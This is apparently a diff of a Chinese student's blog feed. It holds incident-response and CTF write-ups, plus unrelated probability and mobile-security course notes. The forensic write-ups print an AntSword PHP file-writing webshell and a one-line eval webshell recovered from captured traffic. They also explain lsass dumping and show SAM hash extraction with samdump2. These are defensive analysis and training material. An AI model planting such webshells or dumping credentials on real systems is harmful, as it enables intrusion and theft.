+webshell连接地址 - http:&#x2F;&#x2F;攻击者的服务器&#x2F;shell.php
+攻击者服务器IP和端口
+所有执行的命令（文件上传、下载、执行等）
+保存的会话和配置信息
+加密密钥和认证信息
+
+./volatility_2.6_lin64_standalone/vol2 -f vol_easy.vmem --profile=Win7SP1x64 yarascan -Y &quot;solar$&quot; -C 100
+
+yarascan
+
+插件名称：YARA内存扫描插件，用于在内存中搜索特定模式
+Y &quot;solar$&quot;
+Y - YARA扫描规则参数
+&quot;solar$&quot; - 要搜索的字符串，$表示字符串结尾，即精确匹配”solar”
+C 100
+C - 上下文行数参数
+100 - 显示匹配项周围的100行上下文内容
+
+
+得到账户密码 solar2025
+【任务8】VOL_EASY黑客首次操作靶机的关键程序是什么？
+这个题也是没想出来，赛后看别人的wp才慢慢的理解，主要是用了pstree
+pstree 的主要作用：
+
+揭示进程关系 父进程-子进程关系：显示进程的启动来源
+ 进程依赖关系：了解进程间的调用关系
+
+识别异常进程 可疑的父进程：如浏览器启动cmd.exe
+ 异常的进程树：不正常的进程嵌套关系
+
+追踪攻击链
+
+时间线分析 进程启动时间：确定攻击时间序列
+ 进程持续时间：分析攻击持续时间
+
+取证价值： 确定攻击入口点（哪个进程最先被利用）
+ 追踪横向移动（进程如何传播）
+ 识别持久化机制（常驻进程）
+ 发现隐藏进程（不正常的进程关系）
+
+
+./volatility_2.6_lin64_standalone/vol2 -f vol_easy.vmem --profile=Win7SP1x64 pstree   #查看进程树
+
+查看进程树发现了lsass.exe进程
+
+为什么lsass.exe是关键进程呢
+从 lsass.exe 中可以获取：
+
+所有本地用户密码哈希
+域缓存凭据（如果加入域）
+自动登录密码
+服务账户密码
+Kerberos认证材料
+
+攻击者利用方式：
+
+转储lsass内存（使用mimikatz、procdump等工具）
+提取哈希和凭据
+密码破解或哈希传递攻击
+横向移动和权限提升
+
+除了看到进程树中的lsass.exe，我在AntSword.exe的内存中也看到了与之相关的dump_lass.bat
+看到了一句话，dump_lass实际上是lsass，也就是dump了lass程序的内存转储文件，dump_lass &#x3D; dump + lsass，那么这里也可以发现lsass.exe
+
+【任务9】VOL_EASY该关键程序的PID是多少？
+也是在进程树上看，pid &#x3D; 452，但是我输入答案的时候不对
+那我换个方法，使用YARA扫描技术搜索所有包含 lsass.exe 字符串的内存位置，然后发现了PID是456
+./volatility_2.6_lin64_standalone/vol2 -f vol_easy.vmem --profile=Win7SP1x64 yarascan -Y &quot;lsass.exe&quot; -C 100
+
+
+【任务10】VOL_EASY该关键程序的内存文件保存到了什么地方？
+直接在包含 字符串的内存位置找，然后就发现了， C:\\phpstudy_pro\\WWW\\lsass.dmp
+
+应急大师1查找隐藏用户，那么可以在本地用户和组中查看
+lusrmgr.msc
+
+
+发现了隐藏用户 solar$
+应急大师2查找黑客ip，黑客是远程入侵的电脑，那么可以打开事件查找器，查看日志，打开安全，筛选事件ID为4648（远程登入），通过查看发现了可疑ip 192.168.186.139
+
+应急大师3phpstudy_pro——集成的PHP开发环境套件
+安装PHPStudy_Pro后，通常会获得以下核心组件：
+
+Web服务器：
+Apache： 最流行的Web服务器之一。
+Nginx： 以高性能著称的Web服务器和反向代理服务器。
+特点： PHPStudy允许你在这两者之间一键切换，非常方便。
+
+
+PHP解释器：
+软件集成了多个版本的PHP（例如从古老的PHP 5.2到最新的PHP 8.x）。
+你可以随时切换PHP的版本，这对于测试网站在不同PHP环境下的兼容性极其有用。
+
+
+数据库：
+MySQL 或 MariaDB： 用于存储网站数据的关系型数据库。
+通常会提供一个图形化管理工具，如 phpMyAdmin，让你可以通过浏览器轻松管理数据库。
+
+
+其他工具：
+FTP服务器： 用于文件传输。
+Redis &#x2F; Memcached： 用于缓存，提升网站性能。
+网站管理功能： 图形化界面创建网站、设置域名、管理SSL证书等。
+
+
+
+那么一句话木马通常和web服务器相关，那么我么就可以查看phpstudy_pro的目录，然后在www目录下的upload文件夹里发现了.php文件
+
+直接打开打不开，那么复制在桌面重命名为.txt文件，得到一句话木马
+
+solar2025
+应急大师4查找黑客创建隐藏用户的TargetSid（目标账户安全ID），那么也是在事件查看器中查找，筛选事件ID4720（创建用户）
+
+得到 S-1-5-21-3845547894-970975367-1760185533-1000
+应急大师5
+2025/7/23 17:05:45
+应急大师6黑客将这个隐藏用户先后加入了哪几个用户组？
+这个一开始没有思路，后面想想会不会加入用户组也有对应的事件ID，然后就搜索得到事件4732-新用户加入管理员组，筛出来了两个事件估摸着对应了先后两个用户组
+
+查看信息，得到 Users-Administrators
+然后看其他大佬的wp发现也可以直接查看组的属性，来查看组中的成员
+
+应急大师7远程登入，那么直接就是第二题
+
+192.168.186.139:49197
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>solar</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>solar应急响应-2025.11月</title>
+    <url>/2026/07/01/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-2025.11%E6%9C%88/</url>
+    <content><![CDATA[emergency任务一
+
+ip 10.0.100.69多次访问管理界面以及在932、894包在admin&#x2F;system_manage&#x2F;user_config_edit.html 表单提交了一句话木马
+查看返回包，也显示操作成功
+
+
+这里通过查看是yzmCMS内容管理系统，利用了CVE-2020-35971，一个XSS漏洞，攻击者可利用该漏洞在&#x2F;admin&#x2F;system_manage&#x2F;user_config_edit.html页面注入JS代码。
+任务二
+
+根据一句话木马是shell
+这里通过D盾查杀也能看出
+
+任务三
+查看日志可以看到10.0.100.69先是在进行目录扫描爆破，然后对这个yzmCMSuser_config_edit.html界面提交了一句话木马，初始连接的一句话木马是 configs.cache.php，然后紧接着访问了shell.php
+
+
+这道题做的时候提取不出这个shell.php
+
+而且通过挂载这个.vmdk查找shell.php文件也找不到，然后赛后看其他的wp，发现可以根据这个shell.php文件的文件大小然后在回收站找到删除的同样大小的文件
+通过追踪流查看一个返回包，得到了shell.php的大小43
+
+还有一种方法：因为是找创建新的一句话木马文件的MD5，直接wireshark筛”write“
+
+追踪流查看这个webshell的内容
+
+shell = @ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir = @ini_get(&quot;open_basedir&quot;);if ($opdir) &#123;    $ocwd = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);    $oparr = preg_split(base64_decode(&quot;Lzt8Oi8=&quot;), $opdir);    @array_push($oparr, $ocwd, sys_get_temp_dir());        foreach ($oparr as $item) &#123;        if (!@is_writable($item)) &#123;            continue;        &#125;;        $tmdir = $item . &quot;/.a5293&quot;;        @mkdir($tmdir);        if (!@file_exists($tmdir)) &#123;            continue;        &#125;        $tmdir = realpath($tmdir);        @chdir($tmdir);        @ini_set(&quot;open_basedir&quot;, &quot;..&quot;);        $cntarr = @preg_split(&quot;/\\\\|\//&quot;, $tmdir);                for ($i = 0; $i &lt; sizeof($cntarr); $i++) &#123;            @chdir(&quot;..&quot;);        &#125;;        @ini_set(&quot;open_basedir&quot;, &quot;/&quot;);        @rmdir($tmdir);        break;    &#125;;&#125;;function asenc($out) &#123;    return $out;&#125;;function asoutput() &#123;    $output = ob_get_contents();    ob_end_clean();    echo &quot;8484&quot; . &quot;cc18c&quot;;    echo @asenc($output);    echo &quot;86bcb&quot; . &quot;d0c52&quot;;&#125;ob_start();try &#123;    $f = base64_decode(substr($_POST[&quot;d498cc0709be5f&quot;], 2)); //解码文件名    $c = $_POST[&quot;m58d3ef53bcb85&quot;];    //获取文件内容    $c = str_replace(&quot;\r&quot;, &quot;&quot;, $c);    $c = str_replace(&quot;\n&quot;, &quot;&quot;, $c);    $buf = &quot;&quot;;        for ($i = 0; $i &lt; strlen($c); $i += 2) &#123;        $buf .= urldecode(&quot;%&quot; . substr($c, $i, 2));    &#125;        echo (@fwrite(fopen($f, &quot;a&quot;), $buf) ? &quot;1&quot; : &quot;0&quot;);&#125; catch (Exception $e) &#123;    echo &quot;ERROR://&quot; . $e-&gt;getMessage();&#125;;asoutput();die();
+
+
+十六进制转字符串，得到上传的文件内容 &lt;?php @eval($_POST[&quot;qsnctf_2025_lab&quot;]); ?&gt;
+
+然后计算MD5，得到91a29f36879b024d661851b7765f3969
+
+任务四
+这里也是筛“write”
+追踪流分析
+得到
+任务五
+过滤POST，查看分组字节流，69165包里base64解码看到了shell.exe
+
+任务六
+在发现shell.exe的包的前几个POST的包发现了
+
+
+显然这就是上传的shell.exe文件的内容了，经过进制转换和MD5，得到0410284ea74b11d26f868ead6aa646e1
+
+任务七
+在上传这个shell.exe的包后面观察到
+得到 flag{4444}
+任务八
+
+
+这里也是过滤POST请求，在73718包
+任务九
+
+得到密码P@ssw0rd123
+
+cd /mnt/c_drive/Windows/System32/config/
+
+sudo chntpw -l SAM[sudo] password for kali: chntpw version 1.00 140201, (c) Petter N HagenopenHive(SAM) failed: Read-only file system, trying read-onlyHive &lt;SAM&gt; name (from header): &lt;\SystemRoot\System32\Config\SAM&gt;ROOT KEY at offset: 0x001020 * Subkey indexing type is: 686c &lt;lh&gt;File size 65536 [10000] bytes, containing 8 pages (+ 1 headerpage)Used for data: 330/27744 blocks/bytes, unused: 21/12960 blocks/bytes.| RID -|---------- Username ------------| Admin? |- Lock? --|| 01f4 | Administrator                  | ADMIN  |          || 01f7 | DefaultAccount                 |        | dis/lock || 01f5 | Guest                          |        | dis/lock || 03e8 | hidden$                        | ADMIN  |          |
+
+sudo chntpw -u &quot;hidden$&quot; -v SAMchntpw version 1.00 140201, (c) Petter N HagenopenHive(SAM) failed: Read-only file system, trying read-onlyHive &lt;SAM&gt; name (from header): &lt;\SystemRoot\System32\Config\SAM&gt;ROOT KEY at offset: 0x001020 * Subkey indexing type is: 686c &lt;lh&gt;###### Page at 0x1000 ofs_self 0x0, size (delta ofs_next) 0x1000 ############ Page at 0x2000 ofs_self 0x1000, size (delta ofs_next) 0x1000 ############ Page at 0x3000 ofs_self 0x2000, size (delta ofs_next) 0x1000 ############ Page at 0x4000 ofs_self 0x3000, size (delta ofs_next) 0x2000 ############ Page at 0x6000 ofs_self 0x5000, size (delta ofs_next) 0x1000 ############ Page at 0x7000 ofs_self 0x6000, size (delta ofs_next) 0x1000 ############ Page at 0x8000 ofs_self 0x7000, size (delta ofs_next) 0x2000 ############ Page at 0xa000 ofs_self 0x9000, size (delta ofs_next) 0x1000 ######Last HBIN at offset       : 0xa000First non-HBIN page offset: 0xb000hdr-&gt;unknown4 (version?)  : 0x5File size 65536 [10000] bytes, containing 8 pages (+ 1 headerpage)Used for data: 330/27744 blocks/bytes, unused: 21/12960 blocks/bytes.Type of hive guessed to be: 1lmpw_offs: 0x10c, lmpw_len: 24 (0x18)ntpw_offs: 0x124, ntpw_len: 56 (0x38)================= USER EDIT ====================RID     : 1000 [03e8]Username: hidden$fullname: comment : homedir : sam_get_user_grpids:  member path: \SAM\Domains\Builtin\Aliases\Members\S-1-5-21-1320223458-2853483990-1479821641\000003E8sam_get_user_grpids:  member path: \SAM\Domains\Account\Aliases\Members\S-1-5-21-1320223458-2853483990-1479821641\000003E800000221 = Users (which has 3 members)00000220 = Administrators (which has 2 members)Account bits: 0x0010 =[ ] Disabled        | [ ] Homedir req.    | [ ] Passwd not req. | [ ] Temp. duplicate | [X] Normal account  | [ ] NMS account     | [ ] Domain trust ac | [ ] Wks trust act.  | [ ] Srv trust act   | [ ] Pwd don&#x27;t expir | [ ] Auto lockout    | [ ] (unknown 0x08)  | [ ] (unknown 0x10)  | [ ] (unknown 0x20)  | [ ] (unknown 0x40)  | Failed login count: 0, while max tries is: 0Total  login count: 0Crypted NT pw: 03 00 02 00 10 00 00 00 2f f8 a0 71 22 0a d7 81 Crypted LM pw: 03 00 02 00 00 00 00 00 5f 12 4d 8c 0c 64 e9 c4 - - - - User Edit Menu: 1 - Clear (blank) user password(2 - Unlock and enable user account) [seems unlocked already] 3 - Promote user (make user an administrator) 4 - Add user to a group 5 - Remove user from a group q - Quit editing user, back to user selectSelect: [q] &gt; 
+
+这里的 Crypted”并不是真正的加密，而是 RC4 加密的密文，需要用SYSTEM 文件解密才能得到真正的 NTLM 哈希。Windows 的密码哈希是用 SYSKEY 加密的，而 SYSKEY 存储在 SYSKEY 注册表文件中
+
+使用 chntpw 同时加载 SAM 和 SYSTEM
+sudo chntpw -u &quot;hidden$&quot; -v /mnt/c_drive/Windows/System32/config/SAM /mnt/c_drive/Windows/System32/config/SYSTEM
+
+由于我的chntpw版本过低，这里使用samdump2工具
+samdump2 /mnt/c_drive/Windows/System32/config/SYSTEM /mnt/c_drive/Windows/System32/config/SAMAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::hidden$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+任务十
+
+事件查看器筛4720，得到时间
+2700勒索病毒排查任务一
+
+任务二
+预留ID是勒索病毒用来唯一标识受害者的一串字符，攻击者将其作为“凭证”，以便在收到赎金后提供对应的解密工具文件命名格式：原文件名.id-[预留ID].[攻击者邮箱].2700
+4A30C4F9-3524
+任务三查看修改时间
+flag{2025&#x2F;11&#x2F;19 14:31}
+任务四flag{6eff1ea09e63423a48288a77d97e0cc6}
+任务五1983929223@qq.com
+任务六
+39.91.141.213
+任务七
+C2地址是网络攻击中攻击者用于控制受感染设备的服务器地址。
+微步沙箱分析这个钓鱼邮件这里显示两个ip 110.242.70.57和182.9.80.123
+其中182.9.80.123很可能是恶意ipflag{182.9.80.123}
+任务八利用工具diskgenius在桌面发现了flag.bak文件夹打开发现了flag:flag{92047522e5080bad36eda9d29d5a163e}
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>solar</tag>
       </tags>
   </entry>
   <entry>
@@ -21,6 +965,1609 @@
       </categories>
       <tags>
         <tag>tets</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>星途CTF——misc出题笔记</title>
+    <url>/2026/07/01/%E6%98%9F%E9%80%94CTF%E2%80%94%E2%80%94misc%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[星途CTF——misc出题笔记签到——你要的全拿走考点：base解码+Linux文件系统常识
+题目描述：
+师兄临走前拍了拍你的肩膀：”我的东西你要的全部拿走。”
+你打开他留下的压缩包，翻遍了每个角落……
+可那个最重要的东西，怎么找都找不到。
+附件：https://pan.baidu.com/s/1HiTpeXvki3K0smESZqiK5Q?pwd=yeau
+题解：cat &gt; home_backup/home/alice/.bash_history &lt;&lt; &#x27;EOF&#x27;Wow! gooooood finding!!!ls -lacd /var/www/htmllscat index.phpcd ~sudo apt updatesudo apt install vim -ycd /opt/webapppython3 app.pyps aux | grep pythonkill 1234cd ~ssh root@192.168.1.100scp backup.zip root@192.168.1.100:/tmp/mysql -u root -pSuperSecret123 mydbshow databases;select * from users limit 10;exitcd /etccat passwdcat shadowcd ~git clone &lt;https://github.com/example/tools.git&gt;cd tools &amp;&amp; pip3 install -r requirements.txtpython3 exploit.pyexport SECRET=“ZmxhZ3tkMHRmMWwzc190M2xsXzRsbF9zM2NyM3RzfQ==”vim config.ymlcat config.ymlcd /var/logtail -f auth.loggrep &quot;Failed password&quot; auth.logcd ~zip -r backup.zip /var/www/htmlls -lh backup.ziphistory -cEOF
+
+解码base64：ZmxhZ3tkMHRmMWwzc190M2xsXzRsbF9zM2NyM3RzfQ&#x3D;&#x3D;
+flag: flag{d0tf1l3s_t3ll_4ll_s3cr3ts}
+仓库清白吗考点：LSB隐写+Git历史回溯
+题目描述：
+他犯了一个错误。他以为他修正了它。他以为像素不会撒谎。他以为“仓库”会保守秘密。他全错了。现在轮到你了。
+附件 https://pan.baidu.com/s/1PGxQ4ALpmx5AE07hs4kR5A?pwd=yeae
+题解：zsteg分析附件图片，发现存在LSB隐写
+┌──(kali㉿kali)-[~/Desktop]└─$ zsteg challenge.png     imagedata           .. file: byte-swapped Berkeley vfont datab1,rgb,lsb,xy       .. text: &quot;ctf_repo/UT\t&quot;b2,r,msb,xy         .. text: [&quot;U&quot; repeated 9 times]b2,g,msb,xy         .. text: &quot;uuUUUUUUUU&#125;u&quot;b2,b,msb,xy         .. text: &quot;UUUUUUUUUuU_&quot;b2,rgb,msb,xy       .. file: VISX image fileb2,bgr,msb,xy       .. file: VISX image fileb4,r,msb,xy         .. text: [&quot;w&quot; repeated 9 times]b4,g,msb,xy         .. text: [&quot;w&quot; repeated 16 times]b4,b,msb,xy         .. text: [&quot;w&quot; repeated 19 times]b4,rgb,msb,xy       .. text: [&quot;w&quot; repeated 8 times]b4,bgr,msb,xy       .. text: [&quot;w&quot; repeated 19 times]                                                      
+
+提取 zsteg -e b1,rgb,lsb,xy 2.png &gt; out.zip
+┌──(kali㉿kali)-[~/Desktop/ctf_repo]└─$ ls -altotal 28drwxrwxr-x 3 kali kali 4096 Jun  7 18:20 .drwxr-xr-x 7 kali kali 4096 Jun  7 18:20 ..-rwxrw-rw- 1 kali kali  199 Jun  4 00:31 config.pydrwxrwxr-x 8 kali kali 4096 Jun  7 18:20 .git-rwxrw-rw- 1 kali kali  763 Jun  4 00:31 main.py-rwxrw-rw- 1 kali kali   91 Jun  4 00:31 README.md-rwxrw-rw- 1 kali kali  321 Jun  4 00:31 utils.py      
+
+结合附件图片的内容、题目名称和提取出的文件夹中的.git目录，基本上可以推断这是个git仓库。这里有两个思路去看git历史：
+
+看ctf_repo文件夹里的文件，也能发现有个变量SECRET的值被删了，再加上附件图片内容的git log —oneline输出内容中有一行0e2dc87 fix: remove hardcoded credentials—&gt;看git历史进行了什么操作
+ ┌──(kali㉿kali)-[~/Desktop/ctf_repo]└─$ cat config.py # 项目配置文件DATABASE_URL = &quot;postgresql://localhost:5432/mydb&quot;DEBUG = FalseMAX_RETRIES = 3# API credentialsAPI_KEY = &quot;sk-prod-xK9mL2nP&quot;SECRET = &quot;&quot;BASE_URL = &quot;&lt;https://api.example.com&gt;&quot;
+
+看到有个.git目录，git本地数据库
+ .git/├── objects/        ← 所有数据都在这，每次commit的文件快照│     ├── bf/│     │   └── 09498...  ← 第一个commit的数据│     ├── 7c/│     │   └── 31e65...  ← 加了SECRET的那个commit│     ├── 0e/│     │   └── 2dc87...  ← 删掉SECRET的那个commit│     └── ...├── refs/heads/master   ← 指向最新commit└── logs/               ← 操作日志
+ 每次 git commit是在 objects&#x2F; 里新增一个对象，记录这次的文件快照。git rm或者删除一行代码再commit，不会删除旧的对象，相当于新增了一个快照
+
+
+//那么git log --oneline查看历史┌──(kali㉿kali)-[~/Desktop/ctf_repo]└─$ git log --oneline98e9b56 (HEAD -&gt; master) feat: add utility functions7726f84 feat: improve error handling and validation0e2dc87 fix: remove hardcoded credentials7c31e65 feat: add config modulebf09498 init: project setup//根据附件图片中，remove的记录高亮，那么git show查看这条记录，get flag!!!┌──(kali㉿kali)-[~/Desktop/ctf_repo]└─$ git show 0e2dc87 commit 0e2dc87097eb9a032a26cf1474f22555db85a113Author: developer &lt;dev@example.com&gt;Date:   Wed Jun 3 16:31:35 2026 +0000    fix: remove hardcoded credentialsdiff --git a/config.py b/config.pyindex 8d4572c..a5b531b 100644--- a/config.py+++ b/config.py@@ -6,5 +6,5 @@ MAX_RETRIES = 3  # API credentials API_KEY = &quot;sk-prod-xK9mL2nP&quot;-SECRET = &quot;flag&#123;git_never_forgets_a2f8c1&#125;&quot;+SECRET = &quot;&quot; BASE_URL = &quot;&lt;https://api.example.com&gt;&quot;
+
+flag: flag{git_never_forgets_a2f8c1}
+回响考点：流量分析+文件提取+元数据隐写+AES解密
+题目描述：
+他发回了消息。。。
+附件： https://pan.baidu.com/s/1pMiKCmTUUgFIzhVwryOWZg?pwd=yeaa
+题解：看协议分布，Statistics → Protocol Hierarchy，重点分析HTTP协议；
+过滤http，发现有一条 POST &#x2F;upload 请求带了 JPEG 图片，追踪流查看后，以原始数据导出图片，exiftool查看元数据时，发现用户评论的部分添加了新东西——Sp3ct3rK3y!@#$%^ ，初步分析是某个key
+┌──(kali㉿kali)-[~/Desktop]└─$ exiftool photo.jpgExifTool Version Number         : 13.25File Name                       : photo.jpgDirectory                       : .File Size                       : 11 kBFile Modification Date/Time     : 2026:06:06 01:40:52+08:00File Access Date/Time           : 2026:06:07 18:15:18+08:00File Inode Change Date/Time     : 2026:06:06 01:41:34+08:00File Permissions                : -rw-------Warning                         : Processing JPEG-like data after unknown 347-byte headerJFIF Version                    : 1.01Resolution Unit                 : NoneX Resolution                    : 1Y Resolution                    : 1Exif Byte Order                 : Big-endian (Motorola, MM)User Comment                    : Sp3ct3rK3y!@#$%^Image Width                     : 400Image Height                    : 300Encoding Process                : Baseline DCT, Huffman codingBits Per Sample                 : 8Color Components                : 3Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)Image Size                      : 400x300Megapixels                      : 0.120
+
+接下来解释排查还有没有藏东西的地了：
+所有请求的路径都是一些标准路径，没有异常参数，排除；
+除去 GET 请求，POST请求的 body要么是OK，要么是hello world，排除；
+访问的都是微软、百度、Google 这类正常域名，排除；
+那剩下能藏数据最有可能的地方就只有 HTTP Header 了。
+┌──(kali㉿kali)-[~/Desktop]└─$ tshark -r challenge.pcap -Y &quot;http.request&quot; -T fields -e http.user_agent | sort -ucurl/7.88.1Mozilla/5.0 (4hbv0FgszLpTeX8eSErUB+PUgfJSy) Chrome/120.0Mozilla/5.0 (JhCCFAw3zau8snIfHfiE1gNpqtbVH) Safari/537.36Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15Mozilla/5.0 (pZsO/jATiPitFLBm6oyyn9dTzSow==) Firefox/115.0Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0python-requests/2.31.0
+
+tshark提取User-Agent字段，发现了猫腻，有三段字符串，拼凑：
+4hbv0FgszLpTeX8eSErUB+PUgfJSyJhCCFAw3zau8snIfHfiE1gNpqtbVHpZsO/jATiPitFLBm6oyyn9dTzSow==
+尝试base64解码发现是乱码，再加上4x16字节长度，推断是AES加密
+┌──(kali㉿kali)-[~/Desktop]└─$ echo &quot;4hbv0FgszLpTeX8eSErUB+PUgfJSyJhCCFAw3zau8snIfHfiE1gNpqtbVHpZsO/jATiPitFLBm6oyyn9dTzSow==&quot; | base64 -d | xxd00000000: e216 efd0 582c ccba 5379 7f1e 484a d407  ....X,..Sy..HJ..00000010: e3d4 81f2 52c8 9842 0850 30df 36ae f2c9  ....R..B.P0.6...00000020: c87c 77e2 1358 0da6 ab5b 547a 59b0 efe3  .|w..X...[TzY...00000030: 0138 8f8a d14b 066e a8cb 29fd 753c d2a3  .8...K.n..).u&lt;..
+
+在线网站用key&#x3D;Sp3ct3rK3y!@#$%^ 解密密文得到flag
+flag : flag{sp3ctr3_0p3r4t10n_m1dn1ght_s1gn4l_h4s_b33n_c4ptur3d}
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>概率论复习</title>
+    <url>/2026/07/02/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[第一章全概率和贝叶斯公式的计算为主，加上条件概率和独立的性质等作为基础
+知识点：
+习题
+第二章
+知识点：求概率分布
+由概率分布解值
+常见的几种分布：0-1分布超几何分布二项分布泊松分布几何分布
+分布函数
+由概率分布求分布函数
+求概率密度
+由概率密度求分布函数
+常见的概率分布及分布函数均匀分布指数分布正态分布
+习题：P(X&#x3D;1)&#x3D;0.08+0.18&#x3D;0.26P(X&#x3D;2)&#x3D;0.1×0.2&#x3D;0.02P(X&#x3D;1)&#x3D;0.9P(X&#x3D;1)&#x3D;0.9
+P(X&#x3D;2)&#x3D;0.1×0.9&#x3D;0.09P(X&#x3D;2)&#x3D;0.1×0.9&#x3D;0.09
+P(X&#x3D;3)&#x3D;0.12×0.9&#x3D;0.009P(X&#x3D;3)&#x3D;0.12×0.9&#x3D;0.009
+P(X&#x3D;4)&#x3D;0.13×0.9&#x3D;0.0009P(X&#x3D;4)&#x3D;0.13×0.9&#x3D;0.0009
+P(X&#x3D;5)&#x3D;0.14&#x3D;0.0001P(X&#x3D;5)&#x3D;0.14&#x3D;0.0001
+
+
+
+X
+1
+2
+3
+4
+5
+
+
+
+P
+0.9
+0.09
+0.009
+0.0009
+0.0001
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Y&#x3D;−3X+1 的概率分布：
+
+
+
+
+
+
+
+
+
+
+Y
+−5−5
+−2−2
+11
+44
+
+
+
+p
+0.250.25
+0.300.30
+0.250.25
+0.200.20
+
+
+Z&#x3D;X2+1Z&#x3D;X2+1 的概率分布：
+
+
+
+Z
+11
+22
+55
+
+
+
+p
+0.250.25
+0.500.50
+0.250.25
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+第三章
+知识点：联合概率分和边缘概率分布
+习题：P{1&lt;X≤2,3&lt;Y≤5}&#x3D;F(2,5)−F(1,5)−F(2,3)+F(1,3)放回抽样不放回抽样P(X&lt;Y)&#x3D;P(X&#x3D;0,Y&#x3D;1)&#x3D;0.28P(X&#x3D;Y)&#x3D;P(X&#x3D;0,Y&#x3D;0)+P(X&#x3D;1,Y&#x3D;1)&#x3D;0.12+0.42&#x3D;0.54P(X+Y&#x3D;1)&#x3D;P(X&#x3D;0,Y&#x3D;1)+P(X&#x3D;1,Y&#x3D;0)&#x3D;0.28+0.18&#x3D;0.46不独立， f(x,y)≠fX(x)⋅fY(y)f(x,y)&#x3D;fX​(x)⋅fY​(y)
+第四章
+知识点：常见分布的期望与方差：两点分布 p  p(1-p)二项分布 np  np(1-p)泊松分布 入  入均匀分布 (a+b)&#x2F;2  (b-a)的平方&#x2F;12指数分布 1&#x2F;入  1&#x2F;（入的平方）正态分布 μ  Q的平方
+习题：E(X)&#x3D;(−1)×0.2+1×0.3+2×0.4+3×0.1E(X2)&#x3D;(−1)2×0.2+12×0.3+22×0.4+32×0.1E(X+1)&#x3D;E(X)+1E(3X)&#x3D;3E(X)&#x3D;3×1&#x3D;3
+第五章
+知识点：
+习题：
+第六章
+知识点：
+习题：
+第七章
+习题：
+
+第八章
+习题：
+
+
+]]></content>
+      <categories>
+        <category>课业</category>
+      </categories>
+      <tags>
+        <tag>概率论</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>移动互联网安全复习</title>
+    <url>/2026/07/05/%E7%A7%BB%E5%8A%A8%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[录音划分三大考点范围APK 静态检测&#x2F;风险报告部署与基本操作Docker部署
+docker pull opensecurity/mobile-security-framework-mobsfdocker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
+
+
+默认登录账号:mobsf/mobsf
+
+报告结构必须能看懂(这是核心考点,不是操作)
+示例报告：https://pdfhost.io/v/6MK1oLU4y_MobSF_Sta%EE%80%80tic_Analysis_Report_Shar%EE%80%80eIT.pdf
+
+App Security Score &#x2F; Average CVSS Score:综合评分,分数越低风险越高,报告会标注等级(如 CRITICAL RISK &#x2F; HIGH RISK)-
+
+APP COMPONENTS:Activities、Services、Receivers、Providers 各自的总数,以及 Exported 数量——这一块和第3讲AllSafe里”不安全的服务”考点是同一个知识点:exported&#x3D;true 的组件能被外部应用或adb直接调起,是攻击面-
+
+APPLICATION PERMISSIONS:每条权限都标了等级——normal(普通,如 VIBRATE、ACCESS_NETWORK_STATE)、dangerous(危险,如 CAMERA、RECORD_AUDIO、READ_CONTACTS)、signature(签名级)。给你一个权限名,要能判断它属于哪一级、对应什么隐私&#x2F;安全风险
+
+CERTIFICATE INFORMATION:签名算法是否过时(比如SHA1withRSA存在碰撞风险)、是否v1&#x2F;v2&#x2F;v3签名齐全
+
+Code Analysis:硬编码密钥、不安全加密API调用等——这块和作业3的”弱加密漏洞”是同一套逻辑,MobSF本质上是把你手动分析的东西自动扫出来给你截图,要能判断的问题类型
+
+“这个风险条目属于Permission类还是Service类”
+
+“为什么这个APP的Security Score这么低”
+
+“Exported Activity为什么是风险点”
+
+
